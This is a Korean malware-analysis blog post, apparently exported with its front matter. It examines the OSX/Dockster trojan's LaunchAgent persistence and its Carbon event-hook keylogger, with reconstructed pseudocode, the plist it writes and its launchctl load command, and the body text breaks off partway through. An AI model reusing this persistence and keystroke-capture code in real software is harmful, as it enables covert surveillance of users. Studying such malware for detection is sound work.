---
layout: post
title: 'APT: OSX/Dockster analysis (Part II)'
date: 2014-01-29 11:42:14.000000000 +09:00
type: post
published: true
status: publish
categories:
- Malware Analysis
- OS Artifacts
tags:
- APT
- Mac OS X
- malware analysis
meta:
  _edit_last: '1'
  slide_template: default
  pyre_video: ''
  pyre_full_width: 'no'
  pyre_sidebar_position: default
  pyre_fimg_width: ''
  pyre_fimg_height: ''
  pyre_image_rollover_icons: linkzoom
  pyre_link_icon_url: ''
  pyre_related_posts: 'yes'
  pyre_slider_type: 'no'
  pyre_slider: '0'
  pyre_wooslider: '0'
  pyre_flexslider: '0'
  pyre_revslider: '0'
  pyre_elasticslider: '0'
  pyre_fallback: ''
  pyre_page_bg_layout: default
  pyre_page_bg: ''
  pyre_page_bg_color: ''
  pyre_page_bg_full: 'no'
  pyre_page_bg_repeat: repeat
  pyre_wide_page_bg: ''
  pyre_wide_page_bg_color: ''
  pyre_wide_page_bg_full: 'no'
  pyre_wide_page_bg_repeat: repeat
  pyre_header_bg: ''
  pyre_header_bg_color: ''
  pyre_header_bg_full: 'no'
  pyre_header_bg_repeat: repeat
  pyre_page_title: 'no'
  pyre_page_title_text: 'no'
  pyre_page_title_custom_text: ''
  pyre_page_title_custom_subheader: ''
  pyre_page_title_height: ''
  pyre_page_title_bar_bg: ''
  pyre_page_title_bar_bg_retina: ''
  pyre_page_title_bar_bg_full: default
  pyre_page_title_bar_bg_color: ''
  pyre_page_title_bg_parallax: default
  avada_post_views_count: '2288'
  _wpas_done_all: '1'
  sbg_selected_sidebar: a:1:{i:0;s:1:"0";}
  sbg_selected_sidebar_replacement: a:1:{i:0;s:1:"0";}
  fusion_builder_content_backup: "연재\n\n1. <a href=\"http://forensic.n0fate.com/?p=742\">APT:
    OSX/Dockster analysis (Part I)</a>\n\n저번 발표에 이어서 이번에는 다음 두가지 기능에 대해 알아본다.\n<ul>\n\t<li>최초
    실행 시 자동 실행에 등록</li>\n\t<li>'key'를 인자로 줄 경우, 키로깅 기능을 수행</li>\n</ul>\n&nbsp;\n<h2>1.
    최초 실행 시 자동 실행에 등록</h2>\nMac OS X에도 윈도우처럼 프로그램이 자동 실행되도록 등록할 수 있다. 크게 기존 유닉스 시스템에
    있던 자동 실행 요소(ex. rc)와 Mac OS X에서 추가된 자동 실행 지점(ex. LaunchAgent)이 있다. 이 악성코드는 Mac
    OS X에서 추가된 자동 실행 지점을 이용하였다. 보통 일반 트로이 목마는 루트 권한을 얻기 힘들기 때문에 루트 권한이 없는 상황에서 가장
    많이 사용되는 '$HOME/Library/LaunchAgents'에 plist를 생성하는 방법으로 자동 실행을 등록한다. 이곳에 등록을 할경우,
    사용자가 Mac OS X에서 사용자 인증을 받고 로그인되는 시점에 해당 디렉터리에서 지정한 프로그램이 실행된다. 참고로 이 방법 외에도 API를
    이용하여 StartupItem 이라는 곳에  등록하는 방법도 있다. 이러한 방법은 추 후 자동 실행 요소를 따로 정리하도록 하겠다.\n<h3>ExeInstall::ExeInstall
    (생성자)</h3>\n자동 실행에 등록하는 행위는 ExeInstall Class에서 수행한다. 생성자는 다음과 같다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/exeinstall_constructor.jpg\"><img
    class=\"aligncenter size-full wp-image-753\" alt=\"exeinstall_constructor\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/exeinstall_constructor.jpg\"
    width=\"544\" height=\"455\" /></a>\n\n&nbsp;\n<p style=\"text-align: center;\"><strong>Figure.
    ExeInstall Constructor</strong></p>\n인자로 넘어온 버퍼에 \".Dockset\"이라는 문자열과 환경변수를 가져오는
    함수인 getenv API에 \"HOME\"을 주어서 홈 디렉터리 주소를 얻어온 후, \".Dockset\"과 붙인다. 즉, \"$HOME/.Dockset\"이
    된다. 그리고  홈 디렉터리 주소와 \"/Library/LaunchAgents\" 문자열을 합쳐서 \"$HOME/Library/LaunchAgents\"를
    만든다. 모든 문자열은 4바이트 단위로 나눠서 일일히 배열에 넣음으로 문자열이 악성코드의 데이터 영역에 남지 않도록 했다.\n\n&nbsp;\n<h3>ExeInstall::DefaultInstall</h3>\n악성코드가
    최초 실행 시, ExeInstall 클래스를 생성(::ExeInstall())하고, DefaultInstall 메서드를 호출하였다. 이 메서드에서는
    실행된 악성코드의 경로와 생성자에서 만든 \"$HOME/.Dockset\" 문자열을 가져와서 악성코드 개발자가 정의한 API_copyfile(char*,
    char*)로 파일을 이동(move)한다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/api_copyfile.jpg\"><img
    class=\"aligncenter size-full wp-image-754\" alt=\"api_copyfile\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/api_copyfile.jpg\"
    width=\"621\" height=\"442\" /></a>\n\n&nbsp;\n<p style=\"text-align: center;\"><strong>Figure.
    API_copyfile function</strong></p>\n내부적으로는 \"$HOME/.Dockset\" 파일을 Open한 후 unlink로
    기존에 있던 파일을 제거한 다음, 제작자가 정의한 API_filecopy 로 복사한다. 이 작업이 완료되면, chmod에 755를 주어 프로그램에
    실행 권한을 주고, ExeInstall::SetAutoExecUserXML 메서드를 호출한다. 이 메서드에는 다음과 같은 인자가 들어간다.\n\nSetAutoExecUserXML(생성자에서
    만든 구조체, \"$HOME/Library/LaunchAgents\", \"$HOME/.Dockset\", \"mac.Dockset.deman\",
    \"first\");\n\n&nbsp;\n<h3>ExeInstall::SetAutoExecUserXML</h3>\nSetAutoExecUserXML
    메서드는 인자로 받은 정보를 토대로 자동 실행을 위한 데이터를 생성하는 함수이다. 어셈블리 코드 볼 것 없이 Pseudo Code 로 바로
    작성하겠다.\n<pre class=\"lang:default decode:true\" title=\"SetAUtoExecUserXML\">ExeInstall::SetAutoExecUserXML(structure,
    \"$HOME/Library/LaunchAgents\", \"$HOME/.Dockset\", \"mac.Dockset.deman\", \"first\")\n{\n\tchar*
    autostart = \"$HOME/Library/LaunchAgents\";\n\tchar* malware = \"$HOME/.Dockset\";\n\tchar*
    plistname = \"mac.Dockset.deman\";\n\tchar* arguments = \"first\";\n\n\tuint len
    = strlen(autostart);\n\tif(!len)\n\t{\n\t\treturn;\n\t}\n\n\tAPI_mkdir(autostart,
    len, 755o); // 폴더가 없으면 생성 내부적으로 mkdir API 사용\n\n\tstrcpy(buf, autostart);\n\n\tbuf[strlen(buf)]
    = '/'; // $HOME/Library/LaunchAgents/\n\n\tstrcat(buf, plistname); // $HOME/Library/LaunchAgents/mac.Dockset.deman\n\n\tbuf[strlen(buf)]
    = '.pli';\n\tbuf[strlen(buf)+4] = 'st';\n\tbuf[strlen(buf)+6] = 0; // $HOME/Library/LaunchAgents/mac.Dockset.deman.plist\n\n\tunlink(buf);
    // 기존에 있던 파일을 삭제\n\n\tint fd = creat(buf, 600h);\n\n\tif (!fd)\n\t\treturn;\n\n\twrite(fd,
    '&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;?DOCTYPE plist PUBLIC \"-/',
    nil);\n\twrite(fd, '/Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/Pr\n\t\topertyList-1.0.dtd\"&gt;
    &lt;plist version=\"1.0\"&gt; &lt;dict&gt; &lt;key&gt;Label&lt;/key&gt;&lt;string&gt;',
    nil);\n\twrite(fd, plistname, strlen(plistname));\n\twrite(fd, '&lt;/string&gt;&lt;key&gt;OnDemand&lt;/key&gt;&lt;false/&gt;&lt;key&gt;Program&lt;/key&gt;&lt;string&gt;',
    nil);\n\twrite(fd, malware, strlen(malware));\n\twrite(fd, '&lt;/string&gt; &lt;key&gt;ProgramArguments&lt;/key&gt;
    &lt;array&gt; &lt;string&gt;', nil);\n\twrite(fd, arguments, strlen(arguments));\n\twrite(fd,
    '&lt;/string&gt; &lt;/array&gt; &lt;/dict&gt; &lt;/plist&gt;', nil);\n\n\tclose(fd);
    // plist 파일을 생성하고 핸들을 닫음.\n\n\tchmod(buf, 755o); // plist에 실행 권한을 줌.\n\n\treturn;\n}</pre>\n악성코드는
    \"$HOME/Library/LaunchAgents/\" 디렉터리에 mac.Dockset.deman.plist 파일을 생성하고 그 안에 자동
    실행을 위한 정보를 작성한다. 이 plist는 결국 다음과 같이 작성된다.\n<pre class=\"lang:default decode:true\"
    title=\"SetAutoExecUserXML의 결과\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;
    &lt;!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;
    &lt;plist version=\"1.0\"&gt; &lt;dict&gt;\n&lt;key&gt;Label&lt;/key&gt;\n&lt;string&gt;mac.Dockset.deman&lt;/string&gt;\n&lt;key&gt;OnDemand&lt;/key&gt;\n&lt;false/&gt;\n&lt;key&gt;Program&lt;/key&gt;\n&lt;string&gt;/Users/tom/.Dockset&lt;/string&gt;\n&lt;key&gt;ProgramArguments&lt;/key&gt;\n&lt;array&gt;\n&lt;string&gt;first&lt;/string&gt;\n&lt;/array&gt;
    &lt;/dict&gt; &lt;/plist&gt;</pre>\nSetAutoExecUserXML 메서드가 완료되고 나면, DefaultInstall에서는
    system API로 plist 정보를 이용하여 서비스 형태로 악성코드를 로드할 수 있도록 한다. 이는 자바 취약점으로 인해 생성된 프로세스는
    분석 시, 비정상적인 부모를 가지고 있다보니 쉽게 발각될 수 있기 때문이다. 서비스 형태로 로드되는 경우에는 다른 일반 프로세스와 섞여 있을
    수 있기 때문에 은닉성이 더 용이해진다.\n<pre class=\"lang:default decode:true\">system(\"/bin/launchctl
    load ~/Library/LaunchAgents/mac.Dockset.deman.plist\");</pre>\n이 임무가 끝나게되면, DefaultInstall
    메서드가 종료된다. 최초 실행 시 악성코드는 이렇게 system API로 새로운 악성코드를 실행하고 자기자신은 종료된다. 새로운 프로세스는
    launchctl에 의해 \"~/.Dockset first\" 형태로 실행된다. Part I에서 설명했다시피, first라는 인자가 있을 경우,
    ExeInstall::SetWorking이 실행된다. 이 함수는 특별한 임무를 수행하진 않고, 앞서 생성한 plist 파일의 arguments
    필드의 값을 'first' -&gt; 'working'으로 변경한다. 이는 공격자가 악성코드의 진행 상황을 파악하기 위해 만든 것으로 추정된다.\n\n&nbsp;\n<h2>2.
    키로깅 기능 수행</h2>\n악성코드가 앞서 설명한 자동 실행 또는, launchctl load 명령으로 실행된 경우에는 RunKeyLoggerThread
    를 스레드 형태로 실행(pthread_create)한다. 이 함수는 특별한 기능이 있는 것은 아니며, 단지 system API가 '~/.Dockset
    key'를 실행되도록 한다. 이렇게 새로 실행된 프로세스는 main 함수에서 RunKeyLogger 함수로 진입하게 된다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/keyloggerthread.jpg\"><img
    class=\"aligncenter size-full wp-image-755\" alt=\"keyloggerthread\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/keyloggerthread.jpg\"
    width=\"667\" height=\"186\" /></a>\n\nRunKeyLogger 함수가 실행되면, 실질적으로 키로깅에 대한 모든
    기능을 수행하게 된다. 보통 악성코드는 키로깅을 위해 루트킷을 사용하는 것이 좀 더 일반적인 방법이지만, 루트 권한 상승을 위한 익스플로잇이
    없는 상황이라면 다른 방법을 강구해봐야할 것이다. 윈도우의 경우에는 애플리케이션간 또는 사용자와의 통신에서 메시지가 사용된다는 점을 이용하여
    사용자 레벨에서 키보드를 후킹하는 방법인 메시지 후킹(Message Hooking) 기법이 있다. Mac OS X에서는 메시지 대신 이벤트라는
    명칭을 사용하며, EventHandler를 이용한 키보드 및 마우스 후킹을 수행할 수 있다. 이 악성코드도 이 방법을 이용하여 키보드 및 마우스
    정보를 탈취한다.\n\nRunKeyLogger 함수는 최초 실행 시점에 \"$HOME/.Trash\" 폴더를 생성하고 그 안에 \".tmp\"
    파일을 생성한다. \"$HOME/.Trash' 폴더는 Mac OS X 사용자 디렉터리에 기본으로 있는 디렉터리로 Mac OS X의 휴지통 디렉터리이다.
    윈도우의 \"RecycleBin\"과 같다고 보면 된다. 악성코드는 이 디렉터리에 숨김 파일을 만든다. 일반적인 사용자는 휴지통을 잘 보지도
    않을 뿐더러, Finder는 숨김 파일보기가 기본적으로 꺼져있기 때문에 더더욱 확인하기 어렵다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/디렉터리-생성.jpg\"><img
    class=\"aligncenter size-full wp-image-756\" alt=\"디렉터리 생성\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/디렉터리-생성.jpg\"
    width=\"540\" height=\"238\" /></a>\n\n디렉터리 생성이 완료되면, Gestalt 함수를 실행하고 그 결과를 0x102F보다
    클 경우에만 키보드 후킹을 수행한다. getstalt는 Getstalt Manager라고하여, 애플리케이션이 동작하는 환경 정보를 가져오는
    함수로 코어서비스(CoreService)에서 제공하고 있다. getstalt라는 함수에 인자로 전달하는‘sysv’는 System Version
    Selector로 Mac Developer Library에는 다음과 같이 설명하고 있다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Image.png\"><img
    class=\"aligncenter size-full wp-image-757\" alt=\"system version selectors\"
    src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/Image.png\" width=\"1266\"
    height=\"658\" /></a>\n\n즉, getstalt 함수의 결과가 10.3(0x1030) 이상일 경우에만 정상 작동되도록 코드가
    작성되어 있다. 이는 이벤트 모니터링 함수인 InstallEventHandler나 GetEventMonitorTarget가 <a href=\"https://developer.apple.com/legacy/library/documentation/Carbon/reference/Carbon_Event_Manager_Ref/Carbon_Event_Manager_Ref.pdf\"
    target=\"_blank\">카본 이벤트 매니저(Carbon Event Manager)</a>에 있는데 이 기능이 Mac OS X 10.3이상에서만
    사용될 수 있기 때문으로 혹시 모를 에러를 최소화 하기 위한 조치로 보여진다.  이 부분을 지나면 이제 본격적으로 이벤트 핸들러를 등록한다.
    개발자가 정의한 함수인 InstallMyEventHandler를 실행한 후, 핸들링할 이벤트 타입을 정의하는 AddEventTypeToHandler
    함수를 실행한다. 마지막에 RunApplicationEventLoop 함수로 애플리케이션에서 발생하는 모든 이벤트를 핸들링할 수 있도록 한다.\n\n<a
    href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/installmyevent.png\"><img
    class=\"aligncenter size-full wp-image-765\" alt=\"installmyevent\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/installmyevent.png\"
    width=\"821\" height=\"481\" /></a>\n\n일단 사용자가 정의한 InstallMyEventHandler를 알아보기로
    하겠다.\n\n&nbsp;\n<h3>InstallMyEventHandler function</h3>\n<!--?xml version=\"1.0\"
    encoding=\"UTF-8\" standalone=\"no\"?--> 이 함수는 내부적으로 GetApplicationEventTarget으로
    핸들링 대상을 설정하고, InstallEventHandler와 GetEventMonitorTarget을 이용하여 이벤트를 모니터링한다. xCode에보면
    CarbonEvents.h에 이와 관련된 정보가 설정되어 있다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/InstallMyEvent_func.png\"><img
    class=\"aligncenter size-full wp-image-766\" alt=\"InstallMyEvent_func\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/01/InstallMyEvent_func.png\"
    width=\"931\" height=\"484\" /></a>\n\nC 코드로 표현하면 다음과 같다.\n<pre class=\"lang:objc
    decode:true\" title=\"InstallMyEvent\">InstallEventHandler(GetApplicationEventTarget();,
    CmdHandler, 1,  kEventClassCommand, NULL, &amp;fHandler); //\nInstallEventHandler(GetEventMonitorTarget(),
    MonitorHandler, 1, kEventClassCommand, NULL, &amp;sHandler);\nInstallEventHandler(GetApplicationEventTarget(),
    NewEventHandlerUPP(SuspendResumeHandler), 2, kEventClassApplication, NULL, NULL);</pre>\nGetApplicationEventTarget()는
    특정 대상에서 이벤트를 전송하고 그에 대한 핸들러를 등록할 수 있다. 이 때 한가지 문가 발생할 수 있는데, 여러 이벤트가 동일한 이벤트 코드를
    가질 수 있기 때문에 사용자 정의 핸들러에서 이를 구분 짓는데 문제가 발생할 수 있다는 점이다. 예를 들어, 마우스 클릭 이벤트(kEventMouseDown)와
    앱 활성화 이벤트(kEventAppActivated)는 동일한 이벤트 값인 1을 가지기 때문에 미리 모니터링 타켓을 정해줘야 한다. 악성코드는
    이 문제를 해결하기 위해 GetEventMonitorTarget 함수를 사용하였다.\n\n두 번째 인자는 이벤트 발생 시 실행되는 핸들러로
    GetApplicationEventTarget 함수에는 CmdHandler를, GetEventMonitorTarget 함수에는 MonitorHandler를
    설정하였다.\n\n네번째 인자는 cmds는 Command Events (HICommands), appl은 애플리케이션의 실행 종료 등의 이벤트를
    말하는 Application-level Events이다.\n\n사용자가 입력한 명령어를 핸들링 하는 CmdHandler는 전달된 이벤트에 따라
    그에 맞는 Handler를 AddEventTypesToHandler() API로 추가한다.  다음은 CmdHandler에 대한 Pseudo-Code이다.<!--?xml
    version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?-->\n<pre class=\"lang:objc
    decode:true\" title=\"CmdHandler pseudo-code\">int CmdHandler(int a1, EventRef
    theEvent)\n{\n\tif (GetEventClass(theEvent) != kEventClassCommand)\n\t{\n\t\tif(gApplicationActive
    == 1 &amp;&amp; gProcessForegroundEvents == 1)\n\t\t\treturn MonitorHandler(a1,
    theEvent);\n\t\treturn 0;\n\t}\n\n\tGetEventParameter(theEvent, kEventParamDirectObject,
    kEventParamHICommand, 0, 14, 0, &amp;v5);\n\n\tUInt32 result = 0;\n\tUInt32 Code
    = 0;\n\tswitch(items) {\n\t\tcase kCmdMouseDown:\n\t\t\tresult = kEventClassMouse;\n\t\t\tcode
    = kEventMouseDown;\n\t\t\tbreak;\n\t\tcase kCmdKeyModifiersChanged:\n\t\t\tresult
    = kEventClassKeyboard;\n\t\t\tcode = kEventRawKeyModifiersChanged;\n\t\t\tbreak;\n\t\tcase
    kCmdForeground:\n\t\t\tgProcessForegroundEvents = GetControlValue(v7);\n\t\t\tbreak;\n\t\tcase
    kCmdKeyDown:\n\t\t\tresult = kEventClassKeyboard;\n\t\t\tcode = kEventRawKeyDown;\n\t\t\tbreak;\n\t\tcase
    kCmdKeyRepeat:\n\t\t\tresult = kEventClassKeyboard;\n\t\t\tcode = kEventRawKeyRepeat;\n\t\t\tbreak;\n\t\tcase
    kCmdKeyUp:\n\t\t\tresult = kEventClassKeyboard;\n\t\t\tcode = kEventRawKeyRepeat;\n\t\t\tbreak;\n\t\tcase
    kCmdMouseUp:\n\t\t\tresult = kEventClassMouse;\n\t\t\tcode = kEventMouseUp;\n\t\t\tbreak;\n\t\tcase
    kCmdTabletPoint:\n\t\t\tresult = kEventClassTablet;\n\t\t\tcode = 1;\n\t\t\tbreak;\n\t\tcase
    kCmdTabletProximity:\n\t\t\tresult = kEventClassTablet;\n\t\t\tcode = 3;\n\t\t\tbreak;\n\t\tcase
    kCmdMouseWheel:\n\t\t\tresult = kEventClassMouse;\n\t\t\tcode = kEventMouseWheelMoved;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\treturn
    -1;\n\n\t}\n\n\tif(GetControlValue(v7))\n\t{\n\t\tOSStatus handler_status1 = AddEventTypesToHandler(sHandler,
    1, &amp;result);\n\t\tOSStatus handler_status2 = AddEventTypesToHandler(fHandler,
    1, &amp;result);\n\n\t\tif (handler_status1 != 0 || handler_status2 != 0)\n\t\t{\n\t\t\t//
    에러 메시지출력\n\t\t}\n\t\telse\n\t\t{\n\t\t\t// 이벤트 타입 추가 완료 메시지 출력\n\t\t}\n\n\t}\n\telse\n\t{\n\t\tRemoveEventTypesFromHandler(sHandler,
    1, &amp;result);\n\t\tRemoveEventTypesFromHandler(fHandler, 1, &amp;result);\n\t}\n\treturn
    0;\n}</pre>\nAddEventTypesToHandler는 추가적인 핸들러를 등록하는 과정으로 예를 들어 kEventClassKeyboard
    는 키보드 입력을 핸들링 한다는 의미가 된다. 즉 이 함수는 들어오는 커맨드 명령에 따라 새로운 이벤트 타입을 핸들러에 등록하는 역할을 한다.\n\nMonitorHandler의
    경우에는 GetEventClass를 통해 모니터링되는 이벤트의 클래스를 구분짓고 마우스와 키 입력 이벤트를 탈취하는 전형적인 키보드 후킹 방법을
    사용한다.\n<pre class=\"lang:objc decode:true\" title=\"monitorhandler\">// Event
    Code\n// Reference :http://sourcecodebrowser.com/sympy/0.5.8/plotting_2pyglet_2window_2carbon_2constants_8py_source.html\n//
    https://developer.apple.com/legacy/library/documentation/Carbon/Conceptual/Carbon_Event_Manager/CarbonEvents.pdf\n\nint
    MonitorHandler(int a1, EventRef theEvent)\n{\n\tUInt32 eventClass = GetEventClass(theEvent);\n\tUInt32
    result;\n\tif(eventClass == kEventClassMouse) // Mouse\n\t{\n\t\tif(GetEventKind(theEvent)
    == kEventMouseMoved) // 마우스가 이동하는 경우\n\t\t\t// 마우스의 현재 위치 정보를 가져옴\n\t\t\tGetEventParameter(theEvent,
    kEventParamMouseLocation, typeQDPoint, NULL, sizeof(result), NULL, &amp;result);\n\t}\n\telse\n\t{\n\t\tif(eventClass
    == kEventClassTablet) // tablet\n\t\t{\n\t\t\tGetEventKind(theEvent);\n\t\t\treturn
    0;\n\t\t}\n\t\tif(eventClass == kEventClassKeyboard) // keyboard\n\t\t{\n\t\t\tUInt32
    eventKind = GetEventKind(theEvent);\n\t\t\tif(eventKind == kEventRawKeyRepeat)
    // 키가 반복되서 눌릴 경우(키보드를 누르고 있는 경우)\n\t\t\t{\n\t\t\t\tGetEventParameter(theEvent,
    kEventParamKeyCode, typeUInt32, NULL, sizeof(result), NULL, &amp;result);\n\t\t\t\tVirtual2Ascii(result,
    &amp;v7);\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tif(eventKind == kEventRawKeyDown)
    // 키가 눌린 경우\n\t\t\t{\n\t\t\t\t// 키 코드를 가져와서 ASCII 코드로 변환 후, 키로거 파일에 추가\n\t\t\t\tGetEventParameter(theEvent,
    kEventParamKeyCode, typeUInt32, NULL, sizeof(result), NULL, &amp;result);\n\t\t\t\tVirtual2Ascii(MonitorHandler::state,
    ..., &amp;v7);\n\t\t\t\tAppendKeyLogger(v7, 1);\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tif(eventKind
    == kEventRawKeyUp) // 키가 UP된 경우\n\t\t\t{\n\t\t\t\tGetEventParameter(theEvent,
    kEventParamKeyCode, typeUInt32, NULL, sizeof(result), NULL, &amp;result);\n\t\t\t\tVirtual2Ascii(result,
    &amp;v7);\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tif(eventKind == kEventRawKeyModifiersChanged)
    // 다른 키를 누르는 경우\n\t\t\t{\n\t\t\t\tGetEventParameter(theEvent, kEventParamKeyModifiers,
    typeUInt32, NULL, sizeof(result), NULL, &amp;result);\n\t\t\t\tMonitorHandler::state
    = v5;\n\t\t\t}\n\n\t\t}\n\t}\n\treturn 0;\n}</pre>\n이로 인해 공격자는 모든 키보드 입력과 마우스
    입력을 탈취할 수 있다.\n\nInstallMyEventHandler 함수가 완료되고 나면, AddEventTypeToHandler 함수로
    키보드 입력 이벤트를 핸들링할 수 있도록 한다. 앞서 CmdHandler에서도 이 과정이 있음에도 한번 더 핸들러를 등록한다. 즉, 키보드
    후킹은 들어오는 이벤트와 상관없이 무조건 데이터 탈취를 하겠다는 의미이다. 결국 키로거 함수의 기능을 코드로  표현하면 다음과 같이 정리할
    수 있다.\n<pre class=\"lang:objc decode:true\" title=\"RunKeyLogger\">int RunKeyLogger()\n{\n\tint
    status = API_lockfile(\"/var/tmp/48irfhjijwei4.lck\");\n\n\tif (status)\n\t{\n\t\tstrcpy(buf,
    getenv(\"HOME\"));\n\t\tbuf[strlen(buf)] += '/.Tr';\n\t\tbuf[strlen(buf)] += 'ash';\n\t\tmkdir(buf,
    777o);\n\n\t\tbuf[strlen(buf)] += '/.tm';\n\t\tbuf[strlen(buf)] += 'p'; // buf
    = '$HOME/.Trash/.tmp';\n\n\t\tGestalt('sysv', tmp);\n\t\tif(tmp &lt;= 0x102F)
    // Mac OS X 10.3 이하\n\t\t{\n\t\t\treturn -1;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tInstallEventHandlers();
    // 커맨드 핸들러로 핸들링할 이벤트를 선정하고, 모니터 핸들러로 키보드 및 마우스 입력을 탈취\n\t\t\tAddEventTypesToHandler(sHandler,
    1, kEventClassKeyboard|kEventRawKeyDown); // 키보드 입력 이벤트\n\t\t\tAddEventTypesToHandler(fHandler,
    1, kEventClassKeyboard|kEventRawKeyDown);\n\t\t\tAddEventTypesToHandler(sHandler,
    1, kEventClassKeyboard|kEventRawKeyModifiersChanged); // 다른 키 입력 이벤트\n\t\t\tAddEventTypesToHandler(fHandler,
    1, kEventClassKeyboard|kEventRawKeyModifiersChanged);\n\t\t}\n\n\t}\n}</pre>\n일단
    이정도로 자동실행 등록 및 키로깅 기능을 알아보았다. part III에서는 감염 시스템 제어를 위한 C2(command and control)
    기능을 분석해보겠다.\n\n&nbsp;\n\n&nbsp;"
  fusion_builder_converted: 'yes'
author:
  login: n0fate
  email: rapfer@gmail.com
  display_name: n0fate
  first_name: ''
  last_name: ''
---
<p>연재</p>
<p>1. <a href="http://forensic.n0fate.com/?p=742">APT: OSX/Dockster analysis (Part I)</a></p>
<p>저번 발표에 이어서 이번에는 다음 두가지 기능에 대해 알아본다.</p>
<ul>
<li>최초 실행 시 자동 실행에 등록</li>
<li>'key'를 인자로 줄 경우, 키로깅 기능을 수행</li>
</ul>
<p>&nbsp;</p>
<h2>1. 최초 실행 시 자동 실행에 등록</h2>
<p>Mac OS X에도 윈도우처럼 프로그램이 자동 실행되도록 등록할 수 있다. 크게 기존 유닉스 시스템에 있던 자동 실행 요소(ex. rc)와 Mac OS X에서 추가된 자동 실행 지점(ex. LaunchAgent)이 있다. 이 악성코드는 Mac OS X에서 추가된 자동 실행 지점을 이용하였다. 보통 일반 트로이 목마는 루트 권한을 얻기 힘들기 때문에 루트 권한이 없는 상황에서 가장 많이 사용되는 '$HOME/Library/LaunchAgents'에 plist를 생성하는 방법으로 자동 실행을 등록한다. 이곳에 등록을 할경우, 사용자가 Mac OS X에서 사용자 인증을 받고 로그인되는 시점에 해당 디렉터리에서 지정한 프로그램이 실행된다. 참고로 이 방법 외에도 API를 이용하여 StartupItem 이라는 곳에  등록하는 방법도 있다. 이러한 방법은 추 후 자동 실행 요소를 따로 정리하도록 하겠다.</p>
<h3>ExeInstall::ExeInstall (생성자)</h3>
<p>자동 실행에 등록하는 행위는 ExeInstall Class에서 수행한다. 생성자는 다음과 같다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/exeinstall_constructor.jpg"><img class="aligncenter size-full wp-image-753" alt="exeinstall_constructor" src="{{ site.baseurl }}/assets/exeinstall_constructor.jpg" width="544" height="455" /></a></p>
<p>&nbsp;</p>
<p style="text-align: center;"><strong>Figure. ExeInstall Constructor</strong></p>
<p>인자로 넘어온 버퍼에 ".Dockset"이라는 문자열과 환경변수를 가져오는 함수인 getenv API에 "HOME"을 주어서 홈 디렉터리 주소를 얻어온 후, ".Dockset"과 붙인다. 즉, "$HOME/.Dockset"이 된다. 그리고  홈 디렉터리 주소와 "/Library/LaunchAgents" 문자열을 합쳐서 "$HOME/Library/LaunchAgents"를 만든다. 모든 문자열은 4바이트 단위로 나눠서 일일히 배열에 넣음으로 문자열이 악성코드의 데이터 영역에 남지 않도록 했다.</p>
<p>&nbsp;</p>
<h3>ExeInstall::DefaultInstall</h3>
<p>악성코드가 최초 실행 시, ExeInstall 클래스를 생성(::ExeInstall())하고, DefaultInstall 메서드를 호출하였다. 이 메서드에서는 실행된 악성코드의 경로와 생성자에서 만든 "$HOME/.Dockset" 문자열을 가져와서 악성코드 개발자가 정의한 API_copyfile(char*, char*)로 파일을 이동(move)한다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/api_copyfile.jpg"><img class="aligncenter size-full wp-image-754" alt="api_copyfile" src="{{ site.baseurl }}/assets/api_copyfile.jpg" width="621" height="442" /></a></p>
<p>&nbsp;</p>
<p style="text-align: center;"><strong>Figure. API_copyfile function</strong></p>
<p>내부적으로는 "$HOME/.Dockset" 파일을 Open한 후 unlink로 기존에 있던 파일을 제거한 다음, 제작자가 정의한 API_filecopy 로 복사한다. 이 작업이 완료되면, chmod에 755를 주어 프로그램에 실행 권한을 주고, ExeInstall::SetAutoExecUserXML 메서드를 호출한다. 이 메서드에는 다음과 같은 인자가 들어간다.</p>
<p>SetAutoExecUserXML(생성자에서 만든 구조체, "$HOME/Library/LaunchAgents", "$HOME/.Dockset", "mac.Dockset.deman", "first");</p>
<p>&nbsp;</p>
<h3>ExeInstall::SetAutoExecUserXML</h3>
<p>SetAutoExecUserXML 메서드는 인자로 받은 정보를 토대로 자동 실행을 위한 데이터를 생성하는 함수이다. 어셈블리 코드 볼 것 없이 Pseudo Code 로 바로 작성하겠다.</p>
<pre class="lang:default decode:true" title="SetAUtoExecUserXML">ExeInstall::SetAutoExecUserXML(structure, "$HOME/Library/LaunchAgents", "$HOME/.Dockset", "mac.Dockset.deman", "first")
{
	char* autostart = "$HOME/Library/LaunchAgents";
	char* malware = "$HOME/.Dockset";
	char* plistname = "mac.Dockset.deman";
	char* arguments = "first";

	uint len = strlen(autostart);
	if(!len)
	{
		return;
	}

	API_mkdir(autostart, len, 755o); // 폴더가 없으면 생성 내부적으로 mkdir API 사용

	strcpy(buf, autostart);

